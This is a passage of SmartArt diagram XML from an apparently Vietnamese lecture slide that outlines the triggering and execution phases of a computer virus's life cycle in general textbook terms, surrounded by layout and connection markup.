              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Virus </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>được kích hoạt để thực hiện chức năng mà nó đã được dự định. Giống như giai đoạn ngủ đông, giai đoạn khởi động có thể do nhiều sự kiện của hệ thống, bao gồm cả số lần mà bản sao của virut này đã sao chép chính nó</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{011CCCD4-2DD8-45C6-BB09-81F8A703EAA9}" type="parTrans" cxnId="{9641CCC0-8E03-4D8C-8237-822218228D79}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{79332DCE-4E40-4DCE-A5DE-E3B914753E17}" type="sibTrans" cxnId="{9641CCC0-8E03-4D8C-8237-822218228D79}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{209F77CA-74C3-46F4-9DA8-D8CFF5036F69}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Execution (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thực</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hiện</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{776CE1E2-5375-460C-929B-1AE25F853C37}" type="parTrans" cxnId="{F731D262-7EBA-4259-B0E6-C0CF81B86AA7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B2311FDD-B6D8-47CF-B005-99FC2AC84EAA}" type="sibTrans" cxnId="{F731D262-7EBA-4259-B0E6-C0CF81B86AA7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{527A96E6-C2C3-4A58-B92D-44FC2484B83D}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Chức năng được thực hiện, có thể vô </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hại</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thông báo trên màn hình</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>…) </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hoặc gây hư hỏng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>sự phá hủy các chương trình và các tập tin dữ liệu</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>…)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" i="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8E49B45F-6A4F-48D1-8D01-F0237D264BD8}" type="parTrans" cxnId="{C2A2AA9B-F918-4C3F-B370-1CC4D6C5EF61}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2256E630-62CE-42AF-9EE2-D41A89C5491A}" type="sibTrans" cxnId="{C2A2AA9B-F918-4C3F-B370-1CC4D6C5EF61}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{28572451-139C-4E2B-A3E2-4C0C330C45D6}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Triggering (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>kích</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>hoạt</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC9656E0-DF35-4DF2-8AD0-7E46CECA924F}" type="sibTrans" cxnId="{77C2F513-0BD7-490C-BEF6-4B9742398649}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6BEB5132-D2BB-4219-A059-F3C2ADECBB01}" type="parTrans" cxnId="{77C2F513-0BD7-490C-BEF6-4B9742398649}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="outerComposite" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:chMax val="5"/>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EBD88FEF-8EA6-4C76-9104-C7F8EDF6BAA1}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="dummyMaxCanvas" presStyleCnt="0">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{48D2739C-72ED-4FCD-B6B1-001B66AB767E}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_1" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{910CD3DB-4F6C-4B0E-8CAC-D635A55B73BA}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_2" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="4" custScaleY="117538">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AC40530A-4DAC-4B43-A76F-B619E1585E6B}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_3" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="4" custScaleX="104378" custScaleY="110056">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DF1DFB29-F9A9-4965-8E12-3300498E3117}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_4" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="4" custScaleY="102883" custLinFactNeighborX="0" custLinFactNeighborY="-10047">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{477128D5-EEBD-4345-88F6-D00FF99E1DA9}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourConn_1-2" presStyleLbl="fgAccFollowNode1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C543869D-70F6-4EF6-926F-69A54F2503F1}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourConn_2-3" presStyleLbl="fgAccFollowNode1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E2024A96-81D4-4B42-8F9A-E8788F0E2983}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourConn_3-4" presStyleLbl="fgAccFollowNode1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CB24E6A2-65E1-484D-8EAB-957FA34D9D52}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_1_text" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{72184EE1-38F9-46D5-85AA-D86F10808435}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_2_text" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{653860F1-62AE-4078-9CFE-2AC7E54C19CC}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_3_text" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{567585C6-6C13-428A-B488-77D81AFE3779}" type="pres">
      <dgm:prSet presAssocID="{6922977C-042A-4A29-BBE8-0624C4CF945D}" presName="FourNodes_4_text" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{2BBCDE0F-C974-4FC3-A36D-830E4FF85C73}" type="presOf" srcId="{209F77CA-74C3-46F4-9DA8-D8CFF5036F69}" destId="{567585C6-6C13-428A-B488-77D81AFE3779}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{77C2F513-0BD7-490C-BEF6-4B9742398649}" srcId="{6922977C-042A-4A29-BBE8-0624C4CF945D}" destId="{28572451-139C-4E2B-A3E2-4C0C330C45D6}" srcOrd="2" destOrd="0" parTransId="{6BEB5132-D2BB-4219-A059-F3C2ADECBB01}" sibTransId="{BC9656E0-DF35-4DF2-8AD0-7E46CECA924F}"/>
    <dgm:cxn modelId="{3BD43017-42F7-4D36-A285-315270A58C64}" type="presOf" srcId="{1F017BCC-62A3-45E6-90B8-63A6CE3C890E}" destId="{910CD3DB-4F6C-4B0E-8CAC-D635A55B73BA}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{836B7618-2968-4C76-959B-40C800B2082E}" type="presOf" srcId="{BC9656E0-DF35-4DF2-8AD0-7E46CECA924F}" destId="{E2024A96-81D4-4B42-8F9A-E8788F0E2983}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3B10071F-2C33-4466-815F-E5950422F6FB}" srcId="{6922977C-042A-4A29-BBE8-0624C4CF945D}" destId="{85E1035C-E9B2-4067-A024-5CC3D15FBAC0}" srcOrd="1" destOrd="0" parTransId="{01E2DE21-8ABA-4AC6-9358-E12C3FE348AB}" sibTransId="{88DFE316-93D9-4FDE-8D2B-B43ED6F53C87}"/>
    <dgm:cxn modelId="{83D28124-BB98-4E80-9B4E-1DA46C7C0D90}" type="presOf" srcId="{6922977C-042A-4A29-BBE8-0624C4CF945D}" destId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{37AFB524-84A5-4DA0-8EB3-6E405C388989}" type="presOf" srcId="{209F77CA-74C3-46F4-9DA8-D8CFF5036F69}" destId="{DF1DFB29-F9A9-4965-8E12-3300498E3117}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3C46C63B-A89D-4475-A970-C883BADE9863}" type="presOf" srcId="{28572451-139C-4E2B-A3E2-4C0C330C45D6}" destId="{AC40530A-4DAC-4B43-A76F-B619E1585E6B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{F731D262-7EBA-4259-B0E6-C0CF81B86AA7}" srcId="{6922977C-042A-4A29-BBE8-0624C4CF945D}" destId="{209F77CA-74C3-46F4-9DA8-D8CFF5036F69}" srcOrd="3" destOrd="0" parTransId="{776CE1E2-5375-460C-929B-1AE25F853C37}" sibTransId="{B2311FDD-B6D8-47CF-B005-99FC2AC84EAA}"/>
    <dgm:cxn modelId="{19CE5043-5E50-46BF-959B-3B9B2FDF2C63}" type="presOf" srcId="{527A96E6-C2C3-4A58-B92D-44FC2484B83D}" destId="{DF1DFB29-F9A9-4965-8E12-3300498E3117}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{F6E8F66A-A9C8-4A02-AF03-6F3D6DB3C14F}" type="presOf" srcId="{7FADB00A-7145-40DD-9A34-B16AA92F9DB6}" destId="{48D2739C-72ED-4FCD-B6B1-001B66AB767E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{1CDB7074-9D02-4D3E-B521-43317B818CD4}" type="presOf" srcId="{31917318-B128-4E78-BF01-E73D3B4CD690}" destId="{CB24E6A2-65E1-484D-8EAB-957FA34D9D52}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{F09E977A-761E-4805-9845-0570084E55D7}" type="presOf" srcId="{527A96E6-C2C3-4A58-B92D-44FC2484B83D}" destId="{567585C6-6C13-428A-B488-77D81AFE3779}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{B9DB048C-488C-4234-90F9-D86A19A88434}" srcId="{7FADB00A-7145-40DD-9A34-B16AA92F9DB6}" destId="{31917318-B128-4E78-BF01-E73D3B4CD690}" srcOrd="0" destOrd="0" parTransId="{5328DBB3-6A55-4C4E-9DEE-9014D1AEA628}" sibTransId="{94F2CF56-0B34-469D-9FC8-4C7C4B993C83}"/>
    <dgm:cxn modelId="{5566B690-16FD-42AE-818E-90226A092A8B}" type="presOf" srcId="{A8475870-B85D-4EBD-B06D-C4D263630505}" destId="{AC40530A-4DAC-4B43-A76F-B619E1585E6B}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{C2A2AA9B-F918-4C3F-B370-1CC4D6C5EF61}" srcId="{209F77CA-74C3-46F4-9DA8-D8CFF5036F69}" destId="{527A96E6-C2C3-4A58-B92D-44FC2484B83D}" srcOrd="0" destOrd="0" parTransId="{8E49B45F-6A4F-48D1-8D01-F0237D264BD8}" sibTransId="{2256E630-62CE-42AF-9EE2-D41A89C5491A}"/>
    <dgm:cxn modelId="{8808CFA5-8880-400F-B840-82A0C3CD94A6}" srcId="{85E1035C-E9B2-4067-A024-5CC3D15FBAC0}" destId="{1F017BCC-62A3-45E6-90B8-63A6CE3C890E}" srcOrd="0" destOrd="0" parTransId="{9F87E8F0-7F7F-4BE9-A9D2-61A3EEC4F63C}" sibTransId="{BFF52792-87CD-4FA6-9E54-76FA7E08CDB1}"/>
    <dgm:cxn modelId="{C02A48AB-A351-4ED4-8E9A-D8366FDE4FE8}" srcId="{6922977C-042A-4A29-BBE8-0624C4CF945D}" destId="{7FADB00A-7145-40DD-9A34-B16AA92F9DB6}" srcOrd="0" destOrd="0" parTransId="{FBB692A2-E201-441D-808C-C84EB60A09BC}" sibTransId="{291061E3-6E32-4304-973C-391E85FF1E06}"/>
    <dgm:cxn modelId="{8E9E08B0-FEC6-4404-AFEC-FF64977BCA61}" type="presOf" srcId="{28572451-139C-4E2B-A3E2-4C0C330C45D6}" destId="{653860F1-62AE-4078-9CFE-2AC7E54C19CC}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{75014BB0-6716-4049-BE6F-B17136581FEC}" type="presOf" srcId="{85E1035C-E9B2-4067-A024-5CC3D15FBAC0}" destId="{910CD3DB-4F6C-4B0E-8CAC-D635A55B73BA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{708B36B3-54F2-44E0-8C95-CFFDDD7BAA6C}" type="presOf" srcId="{1F017BCC-62A3-45E6-90B8-63A6CE3C890E}" destId="{72184EE1-38F9-46D5-85AA-D86F10808435}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{4DA6C1BF-8D48-4E2D-9112-0922E01B60B3}" type="presOf" srcId="{A8475870-B85D-4EBD-B06D-C4D263630505}" destId="{653860F1-62AE-4078-9CFE-2AC7E54C19CC}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{9641CCC0-8E03-4D8C-8237-822218228D79}" srcId="{28572451-139C-4E2B-A3E2-4C0C330C45D6}" destId="{A8475870-B85D-4EBD-B06D-C4D263630505}" srcOrd="0" destOrd="0" parTransId="{011CCCD4-2DD8-45C6-BB09-81F8A703EAA9}" sibTransId="{79332DCE-4E40-4DCE-A5DE-E3B914753E17}"/>
    <dgm:cxn modelId="{084E66D2-2061-4028-8F91-4168B03C1F80}" type="presOf" srcId="{291061E3-6E32-4304-973C-391E85FF1E06}" destId="{477128D5-EEBD-4345-88F6-D00FF99E1DA9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{817830D8-DDAF-4CD7-9CA3-41AEA2743FBF}" type="presOf" srcId="{88DFE316-93D9-4FDE-8D2B-B43ED6F53C87}" destId="{C543869D-70F6-4EF6-926F-69A54F2503F1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{7CD511DA-9C50-4F39-A715-24FF0A27A349}" type="presOf" srcId="{85E1035C-E9B2-4067-A024-5CC3D15FBAC0}" destId="{72184EE1-38F9-46D5-85AA-D86F10808435}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{30583FDC-5A88-4E56-9436-DA708AC12FA5}" type="presOf" srcId="{7FADB00A-7145-40DD-9A34-B16AA92F9DB6}" destId="{CB24E6A2-65E1-484D-8EAB-957FA34D9D52}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{BEF569F0-EC82-4ECC-A0EE-AAC610EADAEF}" type="presOf" srcId="{31917318-B128-4E78-BF01-E73D3B4CD690}" destId="{48D2739C-72ED-4FCD-B6B1-001B66AB767E}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{D077C020-DCA3-493F-9A54-8DF9D6EE4757}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{EBD88FEF-8EA6-4C76-9104-C7F8EDF6BAA1}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{E9EE0775-CDAA-4F9F-8F5E-4965482B20AF}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{48D2739C-72ED-4FCD-B6B1-001B66AB767E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{58BBFAA8-1292-4697-A50C-BCD0206841B2}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{910CD3DB-4F6C-4B0E-8CAC-D635A55B73BA}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{918521D8-C8EF-4C44-BE77-E643FE195716}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{AC40530A-4DAC-4B43-A76F-B619E1585E6B}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{8F940990-2E5F-422C-AC66-489DDE528B61}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{DF1DFB29-F9A9-4965-8E12-3300498E3117}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{F15A22E8-49CB-45AA-BB70-C3D30B32F823}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{477128D5-EEBD-4345-88F6-D00FF99E1DA9}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{9C554556-FB3D-4D3E-9730-69895FD1B9B0}" type="presParOf" srcId="{A5BE5BF2-E809-4AD4-A08F-9FCDDF7AE170}" destId="{C543869D-70F6-4EF6-926F-69A54F2503F1}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
